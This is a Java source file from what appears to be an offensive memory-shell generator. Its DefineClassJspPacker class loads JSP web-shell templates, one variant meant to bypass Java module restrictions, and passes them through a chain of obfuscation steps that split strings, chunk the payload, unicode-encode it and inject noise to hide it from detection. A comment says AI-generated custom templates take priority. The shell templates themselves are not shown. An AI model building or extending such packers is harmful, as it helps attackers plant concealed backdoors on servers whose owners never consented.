package org.leo.jmg.mem.packer.jsp;

import org.leo.core.util.request.GenerationRandom;
import org.leo.jmg.mem.packer.ClassPackerConfig;
import org.leo.jmg.mem.packer.Packer;
import org.leo.jmg.mem.packer.PackerMeta;
import org.leo.jmg.mem.packer.PackerRegistry;
import org.leo.jmg.mem.packer.PackerResources;
import org.leo.jmg.mem.packer.TemplateRenderer;

@PackerMeta(
    name = "DefineClassJSP", group = "Jsp", order = 3,
    obfuscationSteps = {
        "SPLIT_STRING_LITERALS",
        "CHUNK_PAYLOAD",
        "GHOST_BITS_ENCODE",
        "INJECT_SCRIPTLET_NOISE",
        "INSERT_SCRIPT_NOISE",
        "UNICODE_ENCODE_JSP",
        "WRAP_HTML_JS"
    }
)
public class DefineClassJspPacker implements Packer {

    private final String template = PackerResources.loadTemplate("/memshell-template/shell1.jsp.txt");
    private final String bypassTemplate = PackerResources.loadTemplate("/memshell-template/shell2.jsp.txt");

    @Override
    public String pack(ClassPackerConfig config) {
        try (GenerationRandom.Scope ignored = GenerationRandom.withSeed(config.getObfuscationSeed())) {
            // AI 生成的自定义模板优先；未提供时按 byPassJavaModule 选择内置模板
            String tpl;
            if (config.getCustomTemplate() != null && !config.getCustomTemplate().trim().isEmpty()) {
                tpl = config.getCustomTemplate();
            } else {
                tpl = config.isByPassJavaModule() ? bypassTemplate : template;
            }
            String code = TemplateRenderer.render(tpl, config);
            JspObfuscationPipeline pipeline = (config.getJspObfuscationSteps() != null)
                    ? JspObfuscationPlanner.compile(
                            config.getJspObfuscationSteps(),
                            JspObfuscationPlanContext.packer(
                                    JspObfuscationPlanContext.Format.JSP,
                                    PackerRegistry.getSupportedObfuscationSteps("DefineClassJSP"),
                                    config.getObfuscationSeed())).getPipeline()
                    : JspObfuscationPipeline.jspDefault(config.getObfuscationSeed());
            return pipeline.apply(code);
        }
    }
}
